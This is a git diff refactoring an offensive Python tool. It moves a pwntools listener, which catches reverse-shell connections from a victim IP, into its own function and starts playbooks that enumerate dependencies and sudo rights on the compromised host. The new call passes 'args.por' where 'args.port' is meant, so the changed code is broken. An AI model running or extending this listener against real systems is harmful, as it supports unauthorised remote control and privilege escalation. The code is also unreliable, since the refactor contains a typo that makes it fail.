@@ -15,8 +15,11 @@ def main():
     parser.add_argument('-p', '--port', default=9001)
     args = parser.parse_args()
 
+    listen(args.victim_ip, args.por)
+
+def listen(ip, port):
     ipv4s = utilities.fetch_ipv4_addresses()
-    attacker_ip = pick_best_nic(ipv4s, args.victim_ip)
+    attacker_ip = pick_best_nic(ipv4s, ip)
 
     startup_playbooks = [
         EnumerateDependencies(),
@@ -24,9 +27,9 @@ def main():
         EnumerateSudoList()
     ]
 
-    print(f'Listening {attacker_ip}:{args.port}...', end=' ')
+    print(f'Listening {attacker_ip}:{port}...', end=' ')
     pwn.context.log_level = 'error'
-    with pwn.listen(args.port).wait_for_connection() as client:
+    with pwn.listen(port).wait_for_connection() as client:
         print('Connected!')
         socket = pwnlib_socket_wrapper.PwnlibSocketWrapper(client, attacker_ip)
         shell = pheelshell.Pheelshell(socket)
